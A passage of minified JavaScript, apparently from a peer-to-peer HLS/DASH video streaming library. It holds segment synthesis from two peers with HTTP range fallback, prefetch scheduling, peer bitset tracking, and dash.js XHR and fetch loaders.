${o}`),!1;if(s?this.p2pLoaded+=r.byteLength:this.httpLoaded+=r.byteLength,this.bufArr[o]=r,e?this.reverseOffset=o:this.forwardOffset=o,this._notifyStreamListeners(e,r,o),this.forwardOffset!==this.reverseOffset-1)return!0;this.forwardPeer&&(this.forwardPeer.miss=0),this.reversePeer&&(this.reversePeer.miss=0),clearTimeout(this.timer),this._notifyStreamListenersRemain();const a=n/(performance.now()-this.timeStart);let h=utils_buffer.l.concat(this.bufArr);const c=h.byteLength;if(c===n){let e=h.buffer;const t=new Segment(-1,i,e,this.getFromPeerId());this.emit(hls_next_events.SYN_OUTPUT,t,{speed:a,p2p:this.p2pLoaded,http:this.httpLoaded})}else this.logger.error(`${i} expectedSize ${n} != byteLength ${c} forward ${this.forwardOffset} reverse ${this.reverseOffset}`),this.emit(hls_next_events.SYN_ERROR,this.pieceMsg,error_code.ERROR_SYN_INTERNAL)}_setupPeer(e,t){0===this.timeStart&&(this.timeStart=performance.now());const r=(t,r,s,i,n,o)=>{if(this.destroyed)return;if(!this._validateMsg(r))return void this.logger.error(`onPieceData ${r} not match ${JSON.stringify(this.pieceMsg)} from ${e.remotePeerId}`);const{reverse:a}=o;this._receivePacket(a,i,s)&&!this.waitingRemain&&!this.rangeRequesting&&this.deadline>0&&this._shouldSwitch()&&(this.logger.warn("should switch to http"),clearTimeout(this.timer),this._handleTimeout(!1,!1))},s=t=>{if(this.destroyed)return;const{attachments:r,size:s,seg_id:i}=t;return this._validateMsg(i)?this.pieceMsg.size&&s!==this.pieceMsg.size?(this.logger.error(`onPiece ${i} size not match`),void this.emit(hls_next_events.SYN_ERROR,this.pieceMsg,error_code.ERROR_SYN_INTERNAL)):void(0===this.bufArr.length&&(this.pieceMsg={...this.pieceMsg,seg_id:i,size:s,attachments:r},this.reverseOffset=r,this.bufArr=new Array(r),this.timeReceivePiece=performance.now())):(this.logger.error(`onPiece ${i} not match ${JSON.stringify(this.pieceMsg)}`),void this.deletePeer(e))},i=t=>{this.destroyed||(this._validateMsg(t.seg_id)?this.deletePeer(e):this.logger.error(`onPieceNotFound ${t.seg_id} not match ${JSON.stringify(this.pieceMsg)}`))},n=()=>{this.destroyed||this.deletePeer(e)},o={onPieceData:r,onPiece:s,onPieceNotFound:i,onPieceAbort:n};t?this.reverseEvents=o:this.forwardEvents=o,e.on(hls_next_events.DC_PIECE_DATA,r).once(hls_next_events.DC_PIECE,s).once(hls_next_events.DC_PIECE_NOT_FOUND,i).once(hls_next_events.DC_PIECE_ABORT,n)}_validateMsg(e){return e===this.pieceMsg.seg_id}_shouldSwitch(){const e=DEFAULT_PACKET_SIZE,t=this.pieceMsg.size-e*this.loadedPackets();return this.coordinator.shouldSwitchToHttp(t,this.deadline,this.p2pSpeed,e,this.httpLoadTime)}_startTimer(e,t=!0){this.timer=setTimeout(this._handleTimeout.bind(this,t),e)}loadedPackets(){return this.pieceMsg.attachments-(this.reverseOffset-this.forwardOffset-1)}_handleTimeout(e=!1,t=!0){if(this.destroyed)return;const{seg_id:r,size:s,attachments:i}=this.pieceMsg;if(!s||0===this.timeReceivePiece)return this.logger.warn(`syn load timeout ${r} url ${this.url}`),void this.emit(hls_next_events.SYN_ERROR,this.pieceMsg,error_code.ERROR_SYN_INTERNAL);if(e&&this.timeReceivePiece>0&&(this.logger.warn(`syn ${this.loadedPackets()} of ${i} packets loaded`),this.shouldWaitForRemain(this.httpLoadTime))){const e=this.httpLoadTime;return this.waitingRemain=!0,this.logger.info(`syn wait for remain ${e}`),void this._startTimer(e,!1)}if(t){const e=[this.forwardPeer,this.reversePeer].filter((e=>!!e)).sort(((e,t)=>e.currentLoadSpeed()-t.currentLoadSpeed())).shift();e&&e.loadtimeout()}if(this._cancelP2p(),this.rangeSupported&&this.url)return this._loadRemainBufferByHttp();this._notifyStreamListenersAbort(),this._emitPartialOrError(error_code.ERROR_SYN_ABORT)}shouldWaitForRemain(e){if(e<=0)return!1;return performance.now()-this.timeStart<1e3&&this.timeReceivePiece>0&&e>3e3||this.shouldWaitForRemainUrgent(e)}shouldWaitForRemainUrgent(e){if(0===this.timeReceivePiece||e<=0)return!1;const t=this.p2pSpeed;let r=0;[this.forwardPeer,this.reversePeer].forEach((e=>{e&&(r+=e.loadedBytes())}));const s=(this.pieceMsg.size-r)/e;return this.logger.info(`syn remainTime ${e} speed ${t} required ${s}`),t>=s}get p2pSpeed(){let e=0;return[this.forwardPeer,this.reversePeer].forEach((t=>{t&&(e+=t.currentLoadSpeed())})),e}getFromPeerId(){const{forwardPeer:e,reversePeer:t}=this;return this.isFull()&&e!==t?`${e.remotePeerId}:${t.remotePeerId}`:e?`${e.remotePeerId}`:t?`${t.remotePeerId}`:""}_loadRemainBufferByHttp(){if(this.rangeRequesting)return;const{size:e,seg_id:t}=this.pieceMsg,r=this.rangeEnd>0?this.rangeEnd-1:0,s=this.forwardOffset,i=calRangeWithForwardReverseOffset(s,this.reverseOffset,e,this.rangeStart,r),n=performance.now();let o=this.deadline+this.httpLoadTime-n+1e3;o<2e3?o=2e3:o>6e3&&(o=6e3),this.logger.info(`continue download ${t} from ${this.url} range: ${i} timeout ${o}`),this.rangeRequesting=!0,this.headers&&(this.xhrSetup=e=>{for(const t of Object.keys(this.headers))e.setRequestHeader(t,this.headers[t])}),performRangeRequest(this.url,i,this.xhrSetup,o).then((e=>{if(this.destroyed)return;if(this.rangeRequesting=!1,!e)return void this.emit(hls_next_events.SYN_ERROR,this.pieceMsg,error_code.ERROR_SYN_RANGE_REQUEST);let t=utils_buffer.l.from(e);const r=t.byteLength/(performance.now()-n);this.coordinator.addHttpSpeed(r);const i=splitBytes(t,0);let o=s+1;for(let e=0;e<i.length;e++)this.bufArr[o]||this._receivePacket(!1,o+1,i[e],!1),o++})).catch((e=>{if(this.destroyed)return;this.rangeRequesting=!1,this.logger.error(`http partial download ${t} error ${e}`);const r="timeout"===e?error_code.ERROR_SYN_HTTP_TIMEOUT:error_code.ERROR_SYN_RANGE_REQUEST;this.emit(hls_next_events.SYN_ERROR,this.pieceMsg,r)}))}_print(){const{seg_id:e}=this.pieceMsg;this.logger.info(`syn parallel loading ${e}`)}}const coordinator_ALPHA=.6;class Coordinator{constructor(){this.meanHttpSpeed=0}addHttpSpeed(e){this.meanHttpSpeed=(1-coordinator_ALPHA)*this.meanHttpSpeed+coordinator_ALPHA*e}shouldSwitchToHttp(e,t,r,s,i){if(this.meanHttpSpeed<=0)return!1;if(r>=this.meanHttpSpeed)return!1;if(this.meanHttpSpeed*i>=e)return!1;return((i+t-performance.now())*this.meanHttpSpeed-e)/(this.meanHttpSpeed-r)*r<s}}const SegmentState={ANY:0,COMPLETE:1,PARTIAL_FORWARD:2,PARTIAL_REVERSE:3},generateStateId=(e,t)=>`${e}-${t}`,getBestPairForDownload=(e,t)=>{const r=findPeersWithState(e,SegmentState.COMPLETE,t);if(r.length>=2)return[r[0],r[1]];if(1===r.length){const s=findPeersWithState(e,SegmentState.PARTIAL_FORWARD,t);if(s.length>=1)return[s[0],r[0]];const i=findPeersWithState(e,SegmentState.PARTIAL_REVERSE,t);return i.length>=1?[r[0],i[0]]:0===randomNum(0,1)?[null,r[0]]:[r[0],null]}const s=findPeersWithState(e,SegmentState.PARTIAL_FORWARD,t);if(s.length>=1)return[s[0],null];const i=findPeersWithState(e,SegmentState.PARTIAL_REVERSE,t);return i.length>=1?[null,i[0]]:[null,null]},findPeersWithState=(e,t,r)=>e.filter((e=>e.bitset.has(r,t))),LIVE_LIMIT=20;class BitsetManager{constructor(e=!1,t){if(this.isLive=e,this.internalMap=new Map,t)for(let e of t)this.internalMap.set(e,SegmentState.COMPLETE)}has(e,t=SegmentState.ANY){if(t===SegmentState.ANY)return this.internalMap.has(e);return this.internalMap.get(e)===t}hasCompleteOr(e,t=SegmentState.COMPLETE){const r=this.internalMap.get(e);return r===SegmentState.COMPLETE||r===t}getState(e){return this.internalMap.get(e)}delete(e){return this.internalMap.delete(e)}add(e,t){this.internalMap.set(e,t),this.isLive&&this._trimBitset(e)}array(){return this._keysForStateComplete(this.internalMap)}clear(){this.internalMap.clear()}size(){return this.internalMap.size}_trimBitset(){trimMap(this.internalMap,LIVE_LIMIT)}_keysForStateComplete(e){const t=[];let r=0;for(let[s,i]of e)if(i===SegmentState.COMPLETE&&(t.push(s),r+=s.length,r>6e4))break;return t}}class BitCountsManager{constructor(){this.internalMap=new Map}has(e){return this.internalMap.has(e)}delete(e){return this.internalMap.delete(e)}decre(e){if(this.internalMap.has(e)){let t=this.internalMap.get(e);1===t?this.internalMap.delete(e):this.internalMap.set(e,t-1)}}incre(e){if(this.internalMap.has(e)){let t=this.internalMap.get(e);this.internalMap.set(e,t+1)}else this.internalMap.set(e,1)}clear(){this.internalMap.clear()}size(){return this.internalMap.size}}function getMediaBuffered(e){let t=0,r=e.currentTime,s=e.buffered;for(let e=s.length-1;e>=0;e--)if(r>=s.start(e)&&r<=s.end(e)){t=s.end(e)-r;break}return t>0?t:0}function listenMediaRebuffer(e,t){let r=null;const s=()=>{r||(r=setTimeout((()=>{t()}),2500))},i=()=>{null!=r&&(clearTimeout(r),r=null)};return e.addEventListener("waiting",s),e.addEventListener("playing",i),()=>{e.removeEventListener("waiting",s),e.removeEventListener("playing",i)}}const MIN_P2P_LOAD_TIME=2,VOD_MAX_PREFETCH_COUNT=100,Live_MAX_PREFETCH_COUNT=10;class DashScheduler extends scheduler_base{constructor(e,t){super(e,t),this.logger.info("use DashScheduler"),this.sequential=!1,this.requestingMap=new requesting_map_RequestingMap,this.bitset=new BitsetManager,this.bitCounts=new BitCountsManager,this.targetPeers=[],this.mBufferedDuration=0,this.allowP2pLimit=t.httpLoadTime+MIN_P2P_LOAD_TIME,this.segmentBuilderMap=new requesting_map_RequestingMap,this.resolveMap=new Map,this.playlistInfo=new Map,this.currentSegId="",this.nextSegId="",this.httpTimeouts=0,this.httpRangeErrs=0,this.coordinator=new Coordinator,this.config.live?this.maxPrefetchCount=Live_MAX_PREFETCH_COUNT:(this.maxPrefetchCount=VOD_MAX_PREFETCH_COUNT,this.startCheckPeersTimer())}get httpRangeSupported(){return this.config.httpRangeSupported}handshakePeer(e){this._setupDC(e),e.sendMetaData(this.bitset.array(),this.sequential,this.peersNum,this.isMobileNet)}handleMetaData(e,t){t.field&&(e.bitset=new BitsetManager(this.config.live,t.field),t.field.forEach((e=>{this.bitset.has(e)||this.bitCounts.incre(e)})),this.addPeer(e),this.downloadOnly&&this.chokePeerRequest(e))}peersHas(e){return this.bitCounts.has(e)}reportTraffic(e,t,r){const{fetcher:s}=this.engine;s?(e>0&&s.reportFlow(e),t>0&&s.reportDCTraffic(t,r)):this.logger.error("DC report failed")}checkPeers(){if(!this.hasPeers)return;const{logger:e,config:t,engine:r}=this;if(this.getBufferedDuration()<this.allowP2pLimit)return void e.info(`low buffer time ${this.mBufferedDuration}, skip prefetch`);const{fragMap:s}=r;if(!s.has(this.currentSegId))return;const i=t.live,n=this.peerManager.getPeersOrderByWeight();if(0===n.length)return;const o=[];let a=10;i&&(a=1);let h=0;const c=s.get(this.currentSegId);let l=c.sn;const u=[...s.keys()],d=u.indexOf(this.currentSegId)+1;if(0===d)return;const f=[],_=u.slice(d);for(let e of _){const t=s.get(e);if(!(t&&t.sn>l))break;f.push(e),t.sn===c.sn+1&&(this.nextSegId=e)}if(0===f.length)return;let p=0;for(;o.length<a&&o.length<n.length&&h<this.maxPrefetchCount&&p<f.length;){const r=f[p];if(this.bitset.has(r))p++;else{if(this.bitCounts.has(r)&&!this.requestingMap.has(r))for(let s of n)if(!o.includes(s)&&s.bitset.has(r)){const n=s.bitset.getState(r);let a;a=n===SegmentState.COMPLETE?i?randomNum(0,100)>40:0===randomNum(0,1):n===SegmentState.PARTIAL_REVERSE,o.push(s);const h=new Synthesizer(this.coordinator,this.logger,r,t.httpRangeSupported);this._setupSynthesizer(h),a?h.setReversePeer(s):h.setForwardPeer(s),this.requestingMap.set(r,h),s.requestDataById(r,-1,!1),e.info(`request prefetch ${r} from peer ${s.remotePeerId}`);break}h++,p++}}this.loadedPeerNum=o.length}updateLoaded(e){this.bitset.has(e)||(this.bitset.add(e,SegmentState.COMPLETE),this.bitCounts.has(e)&&this.bitCounts.delete(e))}notifyAllPeers(e,t=SegmentState.COMPLETE){if(this.bitset.has(e,t))return;const{live:r}=this.config,s=generateStateId(e,t);let i;t!==SegmentState.PARTIAL_REVERSE&&(i=t===SegmentState.COMPLETE);const n=this.requestingMap.get(e);for(let o of this.peerManager.getPeerValues())n&&n.hasPeer(o)||o.notifySet.has(s)||o.bitset.hasCompleteOr(e,t)||(o.sendMsgHave(-1,e,{reverse:t===SegmentState.PARTIAL_REVERSE,complete:i}),o.notifySet.add(s),r&&trimSet(o.notifySet,20))}deletePeer(e){this.peerManager.hasPeer(e.remotePeerId)&&e.bitset.array().forEach((e=>{this.bitCounts.decre(e)})),this.cleanRequestingMap(e.remotePeerId),super.deletePeer(e)}hasAndSetTargetPeer(e,t){const{logger:r,config:s}=this;if(t<=this.allowP2pLimit)return!1;const i=1e3*(t-s.httpLoadTime),n=s.httpLoadTime+MIN_P2P_LOAD_TIME;if(this.resolveMap.size>0&&r.info(`scheduler still loading ${[...this.resolveMap.keys()]}, num ${this.resolveMap.size}`),this.requestingMap.has(e)){const o=this.requestingMap.get(e);if(!o)return this._searchAvailablePeers(e);if(!o.shouldWaitForRemain(i)){if(r.warn(`syn prefetch timeout at ${e}`),o.isFull())return!1;const i=this.peerManager.getPeersOrderByWeight(),a=findPeersWithState(i,SegmentState.COMPLETE,e);if(o.hasReversePeer()){const t=a.concat(findPeersWithState(i,SegmentState.PARTIAL_FORWARD,e));if(t.length>0)return this.targetPeers.forwardPeer=t[0],!0}else{const t=a.concat(findPeersWithState(i,SegmentState.PARTIAL_REVERSE,e));if(t.length>0)return this.targetPeers.reversePeer=t[0],!0}return s.httpRangeSupported&&t>n+1}return r.info(`prefetch ${e} wait for remain`),!0}return this._searchAvailablePeers(e)}_searchAvailablePeers(e){if(!this.hasIdlePeers||!this.peersHas(e))return!1;const t=this.peerManager.getPeersOrderByWeight(),[r,s]=getBestPairForDownload(t,e);return this.targetPeers={forwardPeer:r,reversePeer:s},[r,s].some((e=>!!e))}load(e,t,r){const{logger:s,config:i}=this;let n=this.mBufferedDuration-i.httpLoadTime;n>this.dcDownloadTimeout&&(n=this.dcDownloadTimeout);const{forwardPeer:o,reversePeer:a}=this.targetPeers;o||a||(n-=1);let h=this.requestingMap.get(e),c=0,l=0;if(r.Range){const e=r.Range.substring(6);c=Number(e.split("-")[0]),l=Number(e.split("-")[1]),delete r.Range}let u={rangeStart:Number(c),rangeEnd:Number(l)+1,url:t,httpLoadTime:1e3*i.httpLoadTime-500,headers:r};h?h.setExtra(u):(h=new Synthesizer(this.coordinator,this.logger,e,this.httpRangeSupported,u),this._setupSynthesizer(h),this.requestingMap.set(e,h)),h.setTimeout(1e3*n),o&&(h.setForwardPeer(o),o.requestDataById(e,-1,!0)),a&&(h.setReversePeer(a),a.requestDataById(e,-1,!0,{reverse:!0}));const d=new Promise((t=>{const r={resolve:t};this.resolveMap.set(e,r)}));return this.targetPeers={},d}getBufferedDuration(){const e=getMediaBuffered(this.engine.media);return this.mBufferedDuration=e,e>0?e:0}onBufferManagerLost(e,t,r){this.bitset.delete(t),this.bitCounts.delete(t)}destroy(){super.destroy();const{logger:e}=this;this.segmentBuilderMap.clear(),e.warn("destroy ShakaScheduler")}_setupEngine(){}_setupDC(e){super._setupDC(e);const{logger:t}=this;e.on(core_events.DC_HAVE,(t=>{if(!e.bitset)return;const{seg_id:r,complete:s}=t;this.bitset.has(r)||this.bitCounts.incre(r);const i=s?SegmentState.COMPLETE:SegmentState.PARTIAL_FORWARD;e.bitset.add(r,i),e.isAvailableUrgently&&this._handleDCHave(e,r,i)})).on(core_events.DC_HAVE_REVERSE,(t=>{if(!e.bitset)return;const{seg_id:r}=t;this.bitset.has(r)||this.bitCounts.incre(r),e.bitset.hasCompleteOr(r,SegmentState.PARTIAL_REVERSE)||e.bitset.add(r,SegmentState.PARTIAL_REVERSE),e.isAvailableUrgently&&this._handleDCHave(e,r,SegmentState.PARTIAL_REVERSE)})).on(core_events.DC_LOST,(t=>{if(!e.bitset)return;const r=t.seg_id;e.bitset.has(r)&&(e.bitset.delete(r),this.bitCounts.decre(r))})).on(core_events.DC_PIECE,(e=>{const t=e.seg_id;e.ext&&e.ext.incompletes>=6||this.notifyAllPeers(t,e.reverse?SegmentState.PARTIAL_REVERSE:SegmentState.PARTIAL_FORWARD)})).on(core_events.DC_PIECE_CANCEL,(t=>{const{seg_id:r}=t,s=this.requestingMap.get(r);if(s)return void s.removeStreamListener(e.remotePeerId);const i=this.segmentBuilderMap.get(r);i&&i.removeStreamListener(e.remotePeerId)})).on(core_events.DC_PIECE_NOT_FOUND,(t=>{const r=t.seg_id;e.bitset.delete(r),this.bitCounts.decre(r),e.checkIfNeedChoke(!0)})).on(core_events.DC_REQUEST,(r=>{const{seg_id:s,reverse:i}=r,n=this.requestingMap.get(s);let o=!1;n&&n.isDownloading()&&(o=i&&n.hasReversePeer()||!i&&n.hasForwardPeer());if(this.bufMgr.getSegById(s)){t.info(`found ${s} from bufMgr`);const r=this.bufMgr.getSegById(s);e.sendBuffer(-1,r.segId,r.data,{from:"FromCache",reverse:i})}else if(o){t.info(`syn had ${n.loadedPackets()} packets, wait remain from upstream ${n.getFromPeerId()}`);const r=i?n.reversePeer:n.forwardPeer;e.sendPartialBuffer(r.pieceMsg,r.bufArr,{from:n.isFull()?"WaitPartialDouble":"WaitPartialSingle",incompletes:1}),a(n,e,i)}else{const r=this.segmentBuilderMap.get(s);r?(t.info(`peer request ${s} wait from builder, sent ${r.bufferList.length}`),function(e,t){t.sendPartialBuffer(e.pieceMsg,e.bufferList,{from:"FromHttpStream",incompletes:1}),e.bufferList.length<e.pieceMsg.attachments?a(e,t,!1):t.uploading=!1}(r,e)):(t.info(`peer request ${s} wait`),this.bufMgr.once(`${core_events.BM_ADDED_SEG_}${s}`,(r=>{r?(t.info(`peer request notify ${s}`),e.sendBuffer(-1,s,r.data,{from:"NotifySegment",reverse:i})):e.sendPieceNotFound(-1,s)})))}function a(e,t,r){e.addStreamListener(r,t.remotePeerId,((e,r,s,i,n)=>{s?t.sendMsgPieceAbort(i):t.send(i),n&&(t.uploading=!1)}))}}))}onHttpBodyStart(e){this.notifyAllPeers(e,SegmentState.PARTIAL_FORWARD)}onFragLoading(e){this.currentSegId=e}onFragLoaded(e,t){t&&this.notifyAllPeers(e),this.updateLoaded(e)}_setupSynthesizer(e){e.on(core_events.SYN_OUTPUT,((t,r)=>{const{config:s,logger:i}=this,{segId:n,data:o}=t,{speed:a,http:h,p2p:c}=r;this.httpTimeouts>0&&this.httpTimeouts--;const l=this.resolveMap.has(n);if(s.validateSegment(n,new Uint8Array(o))){this.notifyAllPeers(n),this.bitset.has(n)||this.reportTraffic(h,c,a);const r=e.getFromPeerId();if(l){i.info(`receive criticalSeg seg_id ${n}`);const e=this.resolveMap.get(n);this.resolveMap.delete(n),e.resolve({data:o,fromPeerId:r})}else this.bitset.has(n)||(this.bufMgr.putSeg(t),this.updateLoaded(n))}else if(i.error(`segment ${n} validate failed`),l){const e=this.resolveMap.get(n);this.resolveMap.delete(n),e.resolve()}this.requestingMap.delete(n)})).on(core_events.SYN_ERROR,((e,t)=>{const{seg_id:r}=e;if(this.resolveMap.has(r)){const e=this.resolveMap.get(r);this.resolveMap.delete(r),e.resolve()}this.requestingMap.delete(r),this._handleSynError(t)}))}_handleDCHave(e,t,r){const s=0!==this.resolveMap.size;s&&this.resolveMap.has(t)?this._notifySynthesizer(e,t,r,!0):this.httpTimeouts>=1&&t===this.nextSegId&&this._notifySynthesizer(e,t,r,!1),this.config.live&&!s&&queue_microtask_default()((()=>{this.checkPeers()}))}cleanRequestingMap(e){const t=this.peerManager.getPeer(e);if(t)for(let[r,s]of this.requestingMap.internalMap)s.hasPeerId(e)&&(this.logger.info(`delete ${r} in requestingMap`),s.deletePeer(t),this.bitCounts.decre(r),t.bitset.delete(r))}_notifySynthesizer(e,t,r,s=!0){const{logger:i}=this,n=this.requestingMap.get(t);function o(r,s){e.requestDataById(t,-1,s,{reverse:r})}n&&(n.isFull()||(n.isAlmostDeadline()?i.info("almost deadline, ignored"):n.hasForwardPeer()||r!==SegmentState.PARTIAL_FORWARD&&r!==SegmentState.COMPLETE?n.hasReversePeer()||r!==SegmentState.PARTIAL_REVERSE&&r!==SegmentState.COMPLETE||(n.setReversePeer(e),o(!0,s)):(n.setForwardPeer(e),o(!1,s))))}_handleSynError(e){switch(e){case error_code.ERROR_SYN_RANGE_REQUEST:this.logger.warn("ERROR_SYN_RANGE_REQUEST"),this.httpRangeErrs++;break;case error_code.ERROR_SYN_HTTP_TIMEOUT:this.logger.warn("ERROR_SYN_HTTP_TIMEOUT"),this.httpTimeouts+=3}}}const FactoryMaker=function(){let e,t=[];const r={},s={};function i(e,r){for(const s in t){const i=t[s];if(i.context===e&&i.name===r)return i.instance}return null}function n(e,t){return t[e]}function o(e,t,r){e in r&&(r[e]=t)}function a(t,r,s){let i;const n=t.__dashjs_factory_name,o=r[n];if(o){let n=o.instance;if(!o.override)return n.apply({context:r,factory:e},s);i=t.apply({context:r},s),n=n.apply({context:r,factory:e,parent:i},s);for(const e in n)i.hasOwnProperty(e)&&(i[e]=n[e])}else i=t.apply({context:r},s);return i.getClassName=function(){return n},i}return e={extend:function(e,t,r,s){!s[e]&&t&&(s[e]={instance:t,override:r})},getSingletonInstance:i,setSingletonInstance:function(e,r,s){for(const i in t){const n=t[i];if(n.context===e&&n.name===r)return void(t[i].instance=s)}t.push({name:r,context:e,instance:s})},deleteSingletonInstances:function(e){t=t.filter((t=>t.context!==e))},getSingletonFactory:function(e){let s=n(e.__dashjs_factory_name,r);return s||(s=function(r){let s;return void 0===r&&(r={}),{getInstance:function(){return s||(s=i(r,e.__dashjs_factory_name)),s||(s=a(e,r,arguments),t.push({name:e.__dashjs_factory_name,context:r,instance:s})),s}}},r[e.__dashjs_factory_name]=s),s},getSingletonFactoryByName:function(e){return n(e,r)},updateSingletonFactory:function(e,t){o(e,t,r)},getClassFactory:function(e){let t=n(e.__dashjs_factory_name,s);return t||(t=function(t){return void 0===t&&(t={}),{create:function(){return a(e,t,arguments)}}},s[e.__dashjs_factory_name]=t),t},getClassFactoryByName:function(e){return n(e,s)},updateClassFactory:function(e,t){o(e,t,s)}},e}(),core_FactoryMaker=FactoryMaker;function XHRLoader(e){const t=(e=e||{}).requestModifier;let r;return r={load:function(e){const r=new Date,s=e.request;let i=new XMLHttpRequest;if(i.open(e.method,e.url,!0),s.responseType&&(i.responseType=s.responseType),s.range&&i.setRequestHeader("Range","bytes="+s.range),s.requestStartDate||(s.requestStartDate=r),t&&(i=t.modifyRequestHeader(i,{url:e.url})),e.headers)for(let t in e.headers){let r=e.headers[t];r&&i.setRequestHeader(t,r)}i.withCredentials=e.withCredentials,i.onload=e.onload,i.onloadend=e.onend,i.onerror=e.onerror,i.onprogress=e.progress,i.onabort=e.onabort,i.ontimeout=e.ontimeout,i.timeout=e.timeout,i.send(),e.response=i},abort:function(e){const t=e.response;t.onloadend=t.onerror=t.onprogress=void 0,t.abort()}},r}XHRLoader.__dashjs_factory_name="XHRLoader";const factory=core_FactoryMaker.getClassFactory(XHRLoader),utils_XHRLoader=factory;function FetchLoader(e){const t=(e=e||{}).requestModifier,r=e.boxParser;let s;const i=DEFAULT_PACKET_SIZE;function n(e,t){e.reader.read().then(t).catch((function(t){e.update&&e.update([],!1,!0),e.onerror&&200===e.response.status&&e.onerror(t)}))}function o(e,t){if((e=e.filter((r=>r.bytes>t/4/e.length))).length>1){let t=0;const r=(e[e.length-1].ts-e[0].ts)/e.length;return e.forEach(((s,i)=>{const n=e[i+1];if(n){const e=n.ts-s.ts;t+=e<r?e:0}})),t}return null}return s={load:function(e){const s=new Date,a=e.request,h=new Headers;let c;a.range&&h.append("Range","bytes="+a.range),a.requestStartDate||(a.requestStartDate=s),t&&t.modifyRequestHeader({setRequestHeader:function(e,t){h.append(e,t)}},{url:e.url}),"function"==typeof window.AbortController&&(c=new AbortController,e.abortController=c);const l={method:e.method,headers:h,credentials:e.withCredentials?"include":void 0,signal:c?c.signal:void 0};fetch(e.url,l).then((function(t){e.response||(e.response={}),e.response.status=t.status,e.response.statusText=t.statusText,e.response.responseURL=t.url,t.ok||(e.update&&e.update([],!1,!0),e.onerror());let s="";for(const e of t.headers.keys())s+=e+": "+t.headers.get(e)+"\n";if(e.response.responseHeaders=s,!t.body)return t.arrayBuffer().then((function(t){e.response.response=t;const r={loaded:t.byteLength,total:t.byteLength,stream:!1};e.progress(r),e.onload(),e.onend()}));const a=parseInt(t.headers.get("Content-Length"),10);let h=0,c=!1,l=new Uint8Array,u=0;e.bodyStart&&e.bodyStart(isNaN(a)?0:a),e.reader=t.body.getReader();let d=[],f=0,_=0,p=(0,utils_buffer.l)(0);const g=function({value:t,done:s}){if(t&&(f+=t.length),s){if(p.byteLength>0)if(f<=i){const t=(0,utils_buffer.l)(f);p.copy(t,0,_*i,p.byteLength),e.update&&e.update([t],!0)}else{const t=splitBytes(p,_*i);e.update&&e.update(t,!0)}return l&&e.progress({loaded:h,total:isNaN(a)?h:a,lengthComputable:!0,time:o(d,h),stream:!0}),e.response.response=p.buffer,e.onload(),void e.onend()}if(t&&t.length>0){if(p=utils_buffer.l.concat([p,t]),f>=i){f-=i;const t=(0,utils_buffer.l)(i);p.copy(t,0,_*i,(_+1)*i),_++,e.update&&e.update([t],!1)}l=function(e,t){if(0===e.length)return t;const r=new Uint8Array(e.length+t.length);return r.set(e),r.set(t,e.length),r}(l,t),h+=t.length,d.push({ts:Date.now(),bytes:t.length});const s=r.findLastTopIsoBoxCompleted(["moov","mdat"],l,u);if(s.found){const t=s.lastCompletedOffset+s.size;let r;t===l.length?(r=l,l=new Uint8Array):(r=new Uint8Array(l.subarray(0,t)),l=l.subarray(t)),e.progress({data:r.buffer,lengthComputable:!1,noTrace:!0}),u=0}else u=s.lastCompletedOffset,c||(e.progress({lengthComputable:!1,noTrace:!0}),c=!0)}n(e,g)};n(e,g)})).catch((function(t){e.update&&e.update([],!1,!0),e.onerror&&e.onerror(t)}))},abort:function(e){if(e.abortController)e.abortController.abort();else if(e.reader)try{e.reader.cancel()}catch(e){}},calculateDownloadedTime:o},s}FetchLoader.__dashjs_factory_name="FetchLoader";const fetch_loader_factory=core_FactoryMaker.getClassFactory(FetchLoader),fetch_loader=fetch_loader_factory;class HTTPRequest{constructor(){this.tcpid=null,this.type=null,this.url=null,this.actualurl=null,this.range=null,this.trequest=null,this.tresponse=null,this.responsecode=null,this.interval=null,this.trace=[],this._stream=null,this._tfinish=null,this._mediaduration=null,this._quality=null,this._responseHeaders=null,this._serviceLocation=null}}class HTTPRequestTrace{constructor(){this.s=null,this.d=null,this.b=[]}}HTTPRequest.GET="GET",HTTPRequest.HEAD="HEAD",HTTPRequest.MPD_TYPE="MPD",HTTPRequest.XLINK_EXPANSION_TYPE="XLinkExpansion",HTTPRequest.INIT_SEGMENT_TYPE="InitializationSegment",HTTPRequest.INDEX_SEGMENT_TYPE="IndexSegment",HTTPRequest.MEDIA_SEGMENT_TYPE="MediaSegment",HTTPRequest.BITSTREAM_SWITCHING_SEGMENT_TYPE="BitstreamSwitchingSegment",HTTPRequest.MSS_FRAGMENT_INFO_SEGMENT_TYPE="FragmentInfoSegment",HTTPRequest.LICENSE="license",HTTPRequest.OTHER_TYPE="other";class ErrorsBase{extend(e,t){if(!e)return;let r=!!t&&t.override,s=!!t&&t.publicOnly;for(const t in e)!e.hasOwnProperty(t)||this[t]&&!r||s&&-1===e[t].indexOf("public_")||(this[t]=e[t])}}const errors_ErrorsBase=ErrorsBase;class Errors extends errors_ErrorsBase{constructor(){super(),this.MANIFEST_LOADER_PARSING_FAILURE_ERROR_CODE=10,this.MANIFEST_LOADER_LOADING_FAILURE_ERROR_CODE=11,this.XLINK_LOADER_LOADING_FAILURE_ERROR_CODE=12,this.SEGMENTS_UPDATE_FAILED_ERROR_CODE=13,this.SEGMENTS_UNAVAILABLE_ERROR_CODE=14,this.SEGMENT_BASE_LOADER_ERROR_CODE=15,this.TIME_SYNC_FAILED_ERROR_CODE=16,this.FRAGMENT_LOADER_LOADING_FAILURE_ERROR_CODE=17,this.FRAGMENT_LOADER_NULL_REQUEST_ERROR_CODE=18,this.URL_RESOLUTION_FAILED_GENERIC_ERROR_CODE=19,this.APPEND_ERROR_CODE=20,this.REMOVE_ERROR_CODE=21,this.DATA_UPDATE_FAILED_ERROR_CODE=22,this.CAPABILITY_MEDIASOURCE_ERROR_CODE=23,this.CAPABILITY_MEDIAKEYS_ERROR_CODE=24,this.DOWNLOAD_ERROR_ID_MANIFEST_CODE=25,this.DOWNLOAD_ERROR_ID_SIDX_CODE=26,this.DOWNLOAD_ERROR_ID_CONTENT_CODE=27,this.DOWNLOAD_ERROR_ID_INITIALIZATION_CODE=28,this.DOWNLOAD_ERROR_ID_XLINK_CODE=29,this.MANIFEST_ERROR_ID_CODEC_CODE=30,this.MANIFEST_ERROR_ID_PARSE_CODE=31,this.MANIFEST_ERROR_ID_NOSTREAMS_CODE=32,this.TIMED_TEXT_ERROR_ID_PARSE_CODE=33,this.MANIFEST_ERROR_ID_MULTIPLEXED_CODE=34,this.MEDIASOURCE_TYPE_UNSUPPORTED_CODE=35,this.MANIFEST_LOADER_PARSING_FAILURE_ERROR_MESSAGE="parsing failed for ",this.MANIFEST_LOADER_LOADING_FAILURE_ERROR_MESSAGE="Failed loading manifest: 